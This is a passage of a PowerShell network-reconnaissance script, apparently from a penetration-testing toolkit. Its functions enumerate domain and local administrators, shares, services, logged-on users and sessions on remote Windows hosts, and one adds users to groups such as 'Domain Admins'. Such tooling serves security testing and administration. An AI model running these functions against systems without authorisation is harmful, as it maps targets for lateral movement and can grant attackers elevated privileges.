    if ($Domain){
        try {
            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
            $dn = "DC=$($Domain.Replace('.', ',DC='))"
            $groupSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
            # samAccountType=805306368 indicates user objects 
            $groupSearcher.filter = "(&(objectClass=group)(name=$GroupName))"
            $groupSearcher.FindAll() |foreach {$_.properties.samaccountname}
        }
        catch{
            Write-Warning "Error connecting to domain $Domain, is there a trust?"
        }
    }
    else{
        # otherwise, use the current domain
        $groupSearcher = [adsisearcher]"(&(objectClass=group)(name=$GroupName))"
        $groupSearcher.FindAll() | foreach {$_.properties.samaccountname}
    }
}


function Get-NetGroup {
    <#
    .SYNOPSIS
    Gets a list of all current users in a specified domain group.
    
    .DESCRIPTION
    This function utilizes DirectoryServices.AccountManagement to query
    the current AD context or trusted domain for users in a specified group.
    If no GroupName is specified, it defaults to querying the "Domain Admins"
    group. This is a replacement for "net group 'name' /domain"

    .PARAMETER GroupName
    The group name to query for users. If not given, it defaults to "domain admins"
    
    .PARAMETER Domain
    The domain to query for group users.
    
    .OUTPUTS
    System.Array. An array of found users for the specified group.

    .EXAMPLE
    > Get-NetGroup
    Returns the usernames that of members of the "Domain Admins" domain group.
    
    .EXAMPLE
    > Get-NetGroup -GroupName "Power Users"
    Returns the usernames that of members of the "Power Users" domain group.

    .EXAMPLE
    > Get-NetGroup -Domain testing
    Returns the usernames that of members of the "Domain Admins" group
    in the 'testing' domain.

    .LINK
    http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-an-active-directory-group-recursively/
    #>

    [CmdletBinding()]
    param(
        [string]$GroupName = "Domain Admins",
        [Parameter(Mandatory = $False)] [Switch] $FullData,
        [string]$Domain
    )

    # if a domain is specified, try to grab that domain
    if ($Domain){
        try {
            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
            $dn = "DC=$($Domain.Replace('.', ',DC='))"
            $groupSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
            # samAccountType=805306368 indicates user objects 
            $groupSearcher.filter = "(&(objectClass=group)(name=$GroupName))"
        }
        catch{
            Write-Warning "Error connecting to domain $Domain, is there a trust?"
        }
    }
    else{
        # otherwise, use the current domain
        $groupSearcher = [adsisearcher]"(&(objectClass=group)(name=$GroupName))"
    }

    if ($groupSearcher){
        # return full data objects
        if ($FullData.IsPresent) {
            $groupSearcher.FindOne().properties['member'] | ForEach-Object {
                # for each user/member, do a quick adsi object grab
                ([adsi]"LDAP://$_").Properties | ft PropertyName, Value
            }
        }
        else{
            $groupSearcher.FindOne().properties['member'] | ForEach-Object {
                ([adsi]"LDAP://$_").SamAccountName
            }
        }
    }

}


function Get-NetLocalGroups {
    <#
    .SYNOPSIS
    Gets a list of all localgroups on a remote machine.
    
    .DESCRIPTION
    This function utilizes ADSI to query a remote (or local) host for
    all localgroups on a specified remote machine.

    .PARAMETER HostName
    The hostname or IP to query for local group users.

    .PARAMETER HostList
    List of hostnames/IPs to query for local group users.
        
    .OUTPUTS
    System.Array. An array of found local groups.

    .EXAMPLE
    > Get-NetLocalGroups
    Returns all local groups, equivalent to "net localgroup"
    
    .EXAMPLE
    > Get-NetLocalGroups -HostName WINDOWSXP
    Returns all the local groups for WINDOWSXP

    .LINK
    http://stackoverflow.com/questions/21288220/get-all-local-members-and-groups-displayed-together
    #>

    [CmdletBinding()]
    param(
        [string]$HostName = "localhost",
        [string]$HostList
    )

    $Servers = @()

    # if we have a host list passed, grab it
    if($HostList){
        if (Test-Path $HostList){
            foreach ($Item in Get-Content $HostList) {
                if (($Item -ne $null) -and ($Item.trim() -ne "")){
                    $servers += $Item
                }
            }
        }
        else {
            Write-Warning "[!] Input file '$HostList' doesn't exist!"
            $null
        }
    }
    else{
        # otherwise assume a single host name
        $Servers = $($HostName)
    }

    foreach($Server in $Servers)
    {
        $computer = [ADSI]"WinNT://$server,computer"

        $computer.psbase.children | where { $_.psbase.schemaClassName -eq 'group' } | foreach {
            new-object psobject -Property @{
                Server = $Server
                Group = ($_.name)[0]
                SID = (new-object System.Security.Principal.SecurityIdentifier $_.objectsid[0],0).Value
            }
            # order preserving:
            # $out = New-Object System.Collections.Specialized.OrderedDictionary
            # $out.add('Server', $Server)
            # $out.add('Group', ($_.name)[0])
            # $out
        }
    }
}


function Get-NetLocalGroup {
    <#
    .SYNOPSIS
    Gets a list of all current users in a specified local group.
    
    .DESCRIPTION
    This function utilizes ADSI to query a remote (or local) host for
    all members of a specified localgroup.
    Note: in order for the accountdisabled field to be properly extracted,
    just the hostname needs to be supplied, not the IP or FQDN.

    .PARAMETER HostName
    The hostname or IP to query for local group users.

    .PARAMETER HostList
    List of hostnames/IPs to query for local group users.
     
    .PARAMETER GroupName
    The local group name to query for users. If not given, it defaults to "Administrators"
        
    .OUTPUTS
    System.Array. An array of found users for the specified local group.

    .EXAMPLE
    > Get-NetLocalGroup
    Returns the usernames that of members of localgroup "Administrators" on the local host.
    
    .EXAMPLE
    > Get-NetLocalGroup -HostName WINDOWSXP
    Returns all the local administrator accounts for WINDOWSXP

    .LINK
    http://stackoverflow.com/questions/21288220/get-all-local-members-and-groups-displayed-together
    http://msdn.microsoft.com/en-us/library/aa772211(VS.85).aspx
    #>

    [CmdletBinding()]
    param(
        [string]$HostName = "localhost",
        [string]$HostList,
        [string]$GroupName
    )

    $Servers = @()

    # if we have a host list passed, grab it
    if($HostList){
        if (Test-Path $HostList){
            foreach ($Item in Get-Content $HostList) {
                if (($Item -ne $null) -and ($Item.trim() -ne "")){
                    $servers += $Item
                }
            }
        }
        else {
            Write-Warning "[!] Input file '$HostList' doesn't exist!"
            $null
        }
    }
    else{
        # otherwise assume a single host name
        $Servers = $($HostName)
    }

    if (-not $GroupName){
        # resolve the SID for the local admin group - this should usually default to "Administrators"
        $objSID = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
        $objgroup = $objSID.Translate( [System.Security.Principal.NTAccount])
        $GroupName = ($objgroup.Value).Split("\")[1]
    }

    # query the specified group using the WINNT provider, and
    # extract fields as appropriate from the results
    foreach($Server in $Servers)
    {
        $members = @($([ADSI]"WinNT://$server/$groupname").psbase.Invoke("Members"))
        $members | foreach {
            new-object psobject -Property @{
                Server = $Server
                AccountName =( $_.GetType().InvokeMember("Adspath", 'GetProperty', $null, $_, $null)).Replace("WinNT://", "")
                # translate the binary sid to a string
                SID = ConvertSID ($_.GetType().InvokeMember("ObjectSID", 'GetProperty', $null, $_, $null))
                # if the account is local, check if it's disabled, if it's domain, always print $false
                Disabled = $(if((($_.GetType().InvokeMember("Adspath", 'GetProperty', $null, $_, $null)).Replace("WinNT://", "")-like "*/$server/*")) {try{$_.GetType().InvokeMember("AccountDisabled", 'GetProperty', $null, $_, $null)} catch {"ERROR"} } else {$False} ) 
                # check if the member is a group
                IsGroup = ($_.GetType().InvokeMember("Class", 'GetProperty', $Null, $_, $Null) -eq "group")
            }
        }
    }

}


function Get-NetLocalServices {
    <#
    .SYNOPSIS
    Gets a list of all local services running on a remote machine.
    
    .DESCRIPTION
    This function utilizes ADSI to query a remote (or local) host for
    all locally running services.

    .PARAMETER HostName
    The hostname or IP to query for local group users.

    .PARAMETER HostList
    List of hostnames/IPs to query for local group users.

    .OUTPUTS
    System.Array. An array of found services for the specified group.

    .EXAMPLE
    > Get-NetLocalServices -HostName WINDOWSXP
    Returns all the local services running on for WINDOWSXP
    #>

    [CmdletBinding()]
    param(
        [string]$HostName = "localhost",
        [string]$HostList
    )

    $Servers = @()

    # if we have a host list passed, grab it
    if($HostList){
        if (Test-Path $HostList){
            foreach ($Item in Get-Content $HostList) {
                if (($Item -ne $null) -and ($Item.trim() -ne "")){
                    $servers += $Item
                }
            }
        }
        else {
            Write-Warning "[!] Input file '$HostList' doesn't exist!"
            $null
        }
    }
    else{
        # otherwise assume a single host name
        $Servers = $($HostName)
    }

    foreach($Server in $Servers)
    {
        $computer = [ADSI]"WinNT://$server,computer"

        $computer.psbase.children | where { $_.psbase.schemaClassName -eq 'service' } | foreach {
            new-object psobject -Property @{
                Server = $Server
                ServiceName = $_.name
                ServicePath = $_.Path
                ServiceAccountName = $_.ServiceAccountName
            }
        }
    }
}


function Invoke-NetGroupUserAdd {
    <#
    .SYNOPSIS
    Adds a local or domain user to a local or domain group.
    
    .DESCRIPTION
    This function utilizes DirectoryServices.AccountManagement to add a
    user to a local machine or domain group (if permissions allow). It will
    default to addingt to the local machine.

    .PARAMETER UserName
    The domain username to query for.

    .PARAMETER GroupName
    Group to add the user to.

    .PARAMETER Domain
    Domain to add the user to.
    
    .PARAMETER HostName
    Hostname to add the user to, defaults to localhost.
        
    .OUTPUTS
    System.bool. True if the add succeeded, false otherwise.

    .EXAMPLE
    > Invoke-NetGroupUserAdd -UserName john -GroupName Administrators
    Adds a localuser "john" to the local group "Administrators"

    .EXAMPLE
    > Invoke-NetGroupUserAdd -UserName john -GroupName "Domain Admins" -Domain
    Adds the existing user "john" to the domain group "Domain Admins" 
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)] [string]$UserName,
        [Parameter(Mandatory = $True)] [string]$GroupName,
        [string]$Domain,
        [string]$HostName = "localhost"
    )

    # add the assembly if we need it
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    # if we're adding to a remote host, use the WinNT provider
    if($HostName -ne "localhost"){
        try{
            ([ADSI]"WinNT://$HostName/$GroupName,group").add("WinNT://$HostName/$UserName,user")
            Write-Host "User $UserName successfully added to group $GroupName on $HostName"
        }
        catch{
            Write-Warning "Error adding user $UserName to group $GroupName on $HostName"
            return
        }
    }

    # otherwise it's a local or domain add
    else{
        if ($Domain){
            try{
                # try to create the context for the target domain
                $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain", $Domain)
                $d = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)

                # get the domain context
                $ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain
            }
            catch{
                Write-Warning "Error connecting to domain $Domain, is there a trust?"
                return $null
            }
        }
        else{
            # otherwise, get the local machine context
            $ct = [System.DirectoryServices.AccountManagement.ContextType]::Machine
        }

        # get the full principal context
        $context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $ct, $d

        # find the particular group
        $group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($context,$GroupName)

        # add the particular user to the group
        $group.Members.add($context, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $UserName)

        # commit the changes
        $group.Save()
    }
}


function Get-NetFileServers {
    <#
    .SYNOPSIS
    Returns a list of all file servers extracted from user home directories.
    
    .DESCRIPTION
    This function pulls all user information, extracts all file servers from
    user home directories, and returns the uniquified list.

    .PARAMETER Domain
    The domain to query for user file servers.

    .OUTPUTS
    System.Array. An array of found fileservers.

    .EXAMPLE
    > Get-NetFileServers
    Returns active file servers.
    #>

    [CmdletBinding()]
    param(
        [string]$Domain
    )

    $FileServers = @()

    # get all the domain users for the specified or local domain
    if ($Domain){
        $users = Get-NetUsers -Domain $Domain
    }
    else {
        $users = Get-NetUsers
    }

    # extract all home directories and create a unique list
    foreach ($user in $users){
        
        $d = $user.homedirectory
        # pull the HomeDirectory field from this user record
        if ($d){
            $d = $user.homedirectory[0]
        }
        if (($d -ne $null) -and ($d.trim() -ne "")){
            # extract the server name from the homedirectory path
            $parts = $d.split("\")
            if ($parts.count -gt 2){
                # append the base file server to the target $FileServers list
                $FileServers += $parts[2]
            }
        }
    }

    # uniquify the fileserver list
    $t = $FileServers | Get-Unique
    ([Array]$t)
}


function Get-NetShare {
    <#
    .SYNOPSIS
    Gets share information for a specified server.
    
    .DESCRIPTION
    This function will execute the NetShareEnum Win32API call to query
    a given host for open shares. This is a replacement for
    "net share \\hostname"

    .PARAMETER HostName
    The hostname to query for shares.

    .OUTPUTS
    SHARE_INFO_1 structure. A representation of the SHARE_INFO_1
    result structure which includes the name and note for each share.

    .EXAMPLE
    > Get-NetShare
    Returns active shares on the local host.

    .EXAMPLE
    > Get-NetShare -HostName sqlserver
    Returns active shares on the 'sqlserver' host
    #>

    [CmdletBinding()]
    param(
        # default to querying the localhost if no name is supplied
        [string]$HostName = "localhost"
    )

    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }

    # load up the assemblies we need - http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('TestAssembly')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('TestModule', $False)

    # used for C structures below
    $MarshalAsConstructor = [Runtime.InteropServices.MarshalAsAttribute].GetConstructor([Runtime.InteropServices.UnmanagedType])
    $MarshalAsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($MarshalAsConstructor, @([Runtime.InteropServices.UnmanagedType]::LPWStr))

    # 4 for 32 bit, 8 for 64 bit
    $PtrSize = [IntPtr]::size

    # build the SHARE_INFO_1 structure manually using reflection
    #   http://msdn.microsoft.com/en-us/library/windows/desktop/bb525407(v=vs.85).aspx
    #   adapted heavily from @mattifestation's post at http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('SHARE_INFO_1', $Attributes, [System.ValueType], 8+$PtrSize*2)

    $BufferField1 = $TypeBuilder.DefineField('shi1_netname', [String], 'Public, HasFieldMarshal')
    $BufferField1.SetCustomAttribute($MarshalAsCustomAttribute)
    $BufferField1.SetOffset(0)

    $TypeBuilder.DefineField('shi1_type', [UInt32], 'Public').SetOffset($PtrSize*1) | Out-Null

    $BufferField2 = $TypeBuilder.DefineField('shi1_remark', [String], 'Public, HasFieldMarshal')
    $BufferField2.SetCustomAttribute($MarshalAsCustomAttribute)
    $BufferField2.SetOffset($PtrSize*1+8)

    $SHARE_INFO_1 = $TypeBuilder.CreateType()

    # arguments for NetShareEnum
    $QueryLevel = 1
    $ptrInfo = 0 
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0

    # 'manually' convert these strings to unicode by inserting 0x00's between characters
    # because the reflection implicitly converts the string to ascii
    $NewHostName = ""
    foreach ($c in $HostName.ToCharArray()) { $NewHostName += "$c$([char]0x0000)" }

    # adapted heavily from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html    
    $NetShareEnumAddr = Get-ProcAddress netapi32.dll NetShareEnum
    $NetShareEnumDelegate = Get-DelegateType @( [string], [Int32], [Int].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType()) ([Int])
    $NetShareEnum = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NetShareEnumAddr, $NetShareEnumDelegate)
    $Result = $NetShareEnum.Invoke($NewHostName, $QueryLevel,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)

    # have to recast this
    $ptrInfo = [System.Intptr] $ptrInfo

    # Locate the offset of the initial intPtr
    $offset = $ptrInfo.ToInt64()

    Write-Debug "Get-NetShare result: $Result"

    # 0 = success
    if (($Result -eq 0) -and ($offset -gt 0)) {

        # Work out how mutch to increment the pointer by finding out the size of the structure
        $Increment = [System.Runtime.Interopservices.Marshal]::SizeOf($SHARE_INFO_1)

        # parse all the result structures
        for ($i = 0; ($i -lt $EntriesRead); $i++){
            $newintptr = New-Object system.Intptr -ArgumentList $offset
            $Info = [System.Runtime.InteropServices.Marshal]::PtrToStructure($newintptr,$SHARE_INFO_1)
            $Info | Select-Object *
            $offset = $newintptr.ToInt64()
            $offset += $increment
        }
        # cleanup the ptr buffer using NetApiBufferFree
        $NetApiBufferFreeAddr = Get-ProcAddress netapi32.dll NetApiBufferFree
        $NetApiBufferFreeDelegate = Get-DelegateType @( [IntPtr]) ([Int])
        $NetApiBufferFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NetApiBufferFreeAddr, $NetApiBufferFreeDelegate)
        $t = $NetApiBufferFree.Invoke($ptrInfo)
    }
}


function Get-NetLoggedon {
    <#
    .SYNOPSIS
    Gets users actively logged onto a specified server.
    
    .DESCRIPTION
    This function will execute the NetWkstaUserEnum Win32API call to query
    a given host for actively logged on users.

    .PARAMETER HostName
    The hostname to query for logged on users.

    .OUTPUTS
    WKSTA_USER_INFO_1 structure. A representation of the WKSTA_USER_INFO_1
    result structure which includes the username and domain of logged on users.

    .EXAMPLE
    > Get-NetLoggedon
    Returns users actively logged onto the local host.

    .EXAMPLE
    > Get-NetLoggedon -HostName sqlserver
    Returns users actively logged onto the 'sqlserver' host.
    #>

    [CmdletBinding()]
    param(
        # default to querying the localhost if no name is supplied
        [string]$HostName = "localhost"
    )

    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }

    # load up the assemblies we need - http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('TestAssembly')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('TestModule', $False)

    # used for C structures below
    $MarshalAsConstructor = [Runtime.InteropServices.MarshalAsAttribute].GetConstructor([Runtime.InteropServices.UnmanagedType])
    $MarshalAsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($MarshalAsConstructor, @([Runtime.InteropServices.UnmanagedType]::LPWStr))

    # 4 for 32 bit, 8 for 64 bit
    $PtrSize = [IntPtr]::size

    # build the WKSTA_USER_INFO_1 structure (http://msdn.microsoft.com/en-us/library/windows/desktop/aa371409(v=vs.85).aspx) 
    #   manually using reflection
    #   adapted heavily from @mattifestation's post at http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('WKSTA_USER_INFO_1', $Attributes, [System.ValueType], $PtrSize*4)

    $BufferField1 = $TypeBuilder.DefineField('wkui1_username', [String], 'Public, HasFieldMarshal')
    $BufferField1.SetCustomAttribute($MarshalAsCustomAttribute)
    $BufferField1.SetOffset(0)

    $BufferField2 = $TypeBuilder.DefineField('wkui1_logon_domain', [String], 'Public, HasFieldMarshal')
    $BufferField2.SetCustomAttribute($MarshalAsCustomAttribute)
    $BufferField2.SetOffset($PtrSize*1)

    $BufferField3 = $TypeBuilder.DefineField('wkui1_oth_domains', [String], 'Public, HasFieldMarshal')
    $BufferField3.SetCustomAttribute($MarshalAsCustomAttribute)
    $BufferField3.SetOffset($PtrSize*2)

    $BufferField4 = $TypeBuilder.DefineField('wkui1_logon_server', [String], 'Public, HasFieldMarshal')
    $BufferField4.SetCustomAttribute($MarshalAsCustomAttribute)
    $BufferField4.SetOffset($PtrSize*3)

    $WKSTA_USER_INFO_1 = $TypeBuilder.CreateType()

    # Declare the reference variables
    $QueryLevel = 1
    $ptrInfo = [System.Intptr] 0 
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0

    # 'manually' convert this string to unicode by inserting 0x00's between characters
    # because the reflection implicitly converts the string to ascii
    $NewHostName = ""
    foreach ($c in $HostName.ToCharArray()) { $NewHostName += "$c$([char]0x0000)" }

    # adapted heavily from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html    
    $NetWkstaUserEnumAddr = Get-ProcAddress netapi32.dll NetWkstaUserEnum
    $NetWkstaUserEnumDelegate = Get-DelegateType @( [string], [Int32], [Int].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType()) ([Int])
    $NetWkstaUserEnum = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NetWkstaUserEnumAddr, $NetWkstaUserEnumDelegate)
    $Result = $NetWkstaUserEnum.Invoke($NewHostName, $QueryLevel,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)

    # have to recast this
    $ptrInfo = [System.Intptr] $ptrInfo

    # Locate the offset of the initial intPtr
    $offset = $ptrInfo.ToInt64()

    Write-Debug "Get-NetLoggedon result: $Result"

    # 0 = success
    if (($Result -eq 0) -and ($offset -gt 0)) {

        # Work out how mutch to increment the pointer by finding out the size of the structure
        $Increment = [System.Runtime.Interopservices.Marshal]::SizeOf($WKSTA_USER_INFO_1)

        # parse all the result structures
        for ($i = 0; ($i -lt $EntriesRead); $i++){
            $newintptr = New-Object system.Intptr -ArgumentList $offset
            $Info = [System.Runtime.InteropServices.Marshal]::PtrToStructure($newintptr,$WKSTA_USER_INFO_1)
            $Info | Select-Object *
            $offset = $newintptr.ToInt64()
            $offset += $increment
        }
        # cleanup the ptr buffer using NetApiBufferFree
        $NetApiBufferFreeAddr = Get-ProcAddress netapi32.dll NetApiBufferFree
        $NetApiBufferFreeDelegate = Get-DelegateType @( [IntPtr]) ([Int])
        $NetApiBufferFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NetApiBufferFreeAddr, $NetApiBufferFreeDelegate)
        $t = $NetApiBufferFree.Invoke($ptrInfo)
    }
    else 
    {
        switch ($Result) {
          (5)           {Write-Debug "The user does not have access to the requested information."}
          (124)         {Write-Debug "The value specified for the level parameter is not valid."}
          (87)          {Write-Debug 'The specified parameter is not valid.'}
          (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
          (8)           {Write-Debug 'Insufficient memory is available.'}
          (2312)        {Write-Debug 'A session does not exist with the computer name.'}
          (2351)        {Write-Debug 'The computer name is not valid.'}
          (2221)        {Write-Debug 'Username not found.'}
          (53)          {Write-Debug 'Hostname could not be found'}
        }
    }
}


function Get-NetConnections {
    <#
    .SYNOPSIS
    Gets active connections to a server resource.
    
    .DESCRIPTION
    This function will execute the NetConnectionEnum Win32API call to query
    a given host for users connected to a particular resource.
    
    Note: only members of the Administrators or Account Operators local group 
    can successfully execute NetFileEnum

    .PARAMETER HostName
    The hostname to query.

    .PARAMETER Share
    The share to check connections to.

    .OUTPUTS
    CONNECTION_INFO_1  structure. A representation of the CONNECTION_INFO_1 
    result structure which includes the username host of connected users.

    .EXAMPLE
    > Get-NetConnections -HostName fileserver -Share secret
    Returns users actively connected to the share 'secret' on a fileserver.
    #>
    [CmdletBinding()]
    param(
        # default to querying the localhost if no name is supplied
        [string]$HostName = "localhost",
        [string]$Share = "C$"
    )

    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }

    # load up the assemblies we need - http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('TestAssembly')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('TestModule', $False)

    # used for C structures below
    $MarshalAsConstructor = [Runtime.InteropServices.MarshalAsAttribute].GetConstructor([Runtime.InteropServices.UnmanagedType])
    $MarshalAsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($MarshalAsConstructor, @([Runtime.InteropServices.UnmanagedType]::LPWStr))

    # 4 for 32 bit, 8 for 64 bit
    $PtrSize = [IntPtr]::size

    # build the FILE_INFO_3 structure manually using reflection
    #   adapted heavily from @mattifestation's post at http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('FILE_INFO_3', $Attributes, [System.ValueType], 24+$PtrSize*2)

    $TypeBuilder.DefineField('coni1_id', [UInt32], 'Public').SetOffset(0) | Out-Null
    $TypeBuilder.DefineField('coni1_type', [UInt32], 'Public').SetOffset(4) | Out-Null
    $TypeBuilder.DefineField('coni1_num_opens', [UInt32], 'Public').SetOffset(8) | Out-Null
    $TypeBuilder.DefineField('coni1_num_users', [UInt32], 'Public').SetOffset(12) | Out-Null
    $TypeBuilder.DefineField('coni1_time', [UInt32], 'Public').SetOffset(16) | Out-Null

    $BufferField1 = $TypeBuilder.DefineField('coni1_username', [String], 'Public, HasFieldMarshal')
    $BufferField1.SetCustomAttribute($MarshalAsCustomAttribute)
    $BufferField1.SetOffset(24)

    $BufferField2 = $TypeBuilder.DefineField('coni1_netname', [String], 'Public, HasFieldMarshal')
    $BufferField2.SetCustomAttribute($MarshalAsCustomAttribute)
    $BufferField2.SetOffset(24+$PtrSize)

    $CONNECTION_INFO_1 = $TypeBuilder.CreateType()

    # arguments for NetConnectionEnum
    $QueryLevel = 1
    $ptrInfo = 0 
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0

    # 'manually' convert these strings to unicode by inserting 0x00's between characters
    # because the reflection implicitly converts the string to ascii
    $NewHostName = ""
    foreach ($c in $HostName.ToCharArray()) { $NewHostName += "$c$([char]0x0000)" }
    $NewShare = ""
    foreach ($c in $Share.ToCharArray()) { $NewShare += "$c$([char]0x0000)" }

    # adapted heavily from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html    
    $NetConnectionEnumAddr = Get-ProcAddress netapi32.dll NetConnectionEnum
    $NetConnectionEnumDelegate = Get-DelegateType @( [string], [string], [Int32], [Int].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType()) ([Int])
    $NetConnectionEnum = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NetConnectionEnumAddr, $NetConnectionEnumDelegate)
    $Result = $NetConnectionEnum.Invoke($NewHostName, $NewShare, $QueryLevel,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)

    # have to recast this
    $ptrInfo = [System.Intptr] $ptrInfo

    # Locate the offset of the initial intPtr
    $offset = $ptrInfo.ToInt64()

    Write-Debug "Get-NetConnection result: $Result"

    # 0 = success
    if (($Result -eq 0) -and ($offset -gt 0)) {

        # Work out how mutch to increment the pointer by finding out the size of the structure
        $Increment = [System.Runtime.Interopservices.Marshal]::SizeOf($CONNECTION_INFO_1)

        # parse all the result structures
        for ($i = 0; ($i -lt $EntriesRead); $i++){
            $newintptr = New-Object system.Intptr -ArgumentList $offset
            $Info = [system.runtime.interopservices.marshal]::PtrToStructure($newintptr,$CONNECTION_INFO_1)
            $Info | Select-Object *
            $offset = $newintptr.ToInt64()
            $offset += $increment
        }
        # cleanup the ptr buffer using NetApiBufferFree
        $NetApiBufferFreeAddr = Get-ProcAddress netapi32.dll NetApiBufferFree
        $NetApiBufferFreeDelegate = Get-DelegateType @( [IntPtr]) ([Int])
        $NetApiBufferFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NetApiBufferFreeAddr, $NetApiBufferFreeDelegate)
        $t = $NetApiBufferFree.Invoke($ptrInfo)
    }
    else 
    {
        switch ($Result) {
          (5)           {Write-Debug "The user does not have access to the requested information."}
          (124)         {Write-Debug "The value specified for the level parameter is not valid."}
          (87)          {Write-Debug 'The specified parameter is not valid.'}
          (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
          (8)           {Write-Debug 'Insufficient memory is available.'}
          (2312)        {Write-Debug 'A session does not exist with the computer name.'}
          (2351)        {Write-Debug 'The computer name is not valid.'}
          (2221)        {Write-Debug 'Username not found.'}
          (53)          {Write-Debug 'Hostname could not be found'}
        }
    }
}


function Get-NetSessions {
    <#
    .SYNOPSIS
    Gets active sessions for a specified server.
    Heavily adapted from dunedinite's post on stackoverflow (see LINK below)

    .DESCRIPTION
    This function will execute the NetSessionEnum Win32API call to query
    a given host for active sessions on the host.

    .PARAMETER HostName
    The hostname to query for active sessions.

    .PARAMETER UserName
    The user name to query for active sessions.

    .OUTPUTS
    SESSION_INFO_10 structure. A representation of the SESSION_INFO_10
    result structure which includes the host and username associated
    with active sessions.

    .EXAMPLE
    > Get-NetSessions
    Returns active sessions on the local host.

    .EXAMPLE
    > Get-NetSessions -HostName sqlserver
    Returns active sessions on the 'sqlserver' host.

    .LINK
    http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html
    #>
    
    [CmdletBinding()]
    param(
        # default to querying the localhost if no name is supplied
        [string]$HostName = "localhost",
        [string]$UserName = ""
    )

    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }

    # load up the assemblies we need - http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('TestAssembly')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('TestModule', $False)

    # used for C structures below
    $MarshalAsConstructor = [Runtime.InteropServices.MarshalAsAttribute].GetConstructor([Runtime.InteropServices.UnmanagedType])
    $MarshalAsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($MarshalAsConstructor, @([Runtime.InteropServices.UnmanagedType]::LPWStr))

    # 4 for 32 bit, 8 for 64 bit
    $PtrSize = [IntPtr]::size

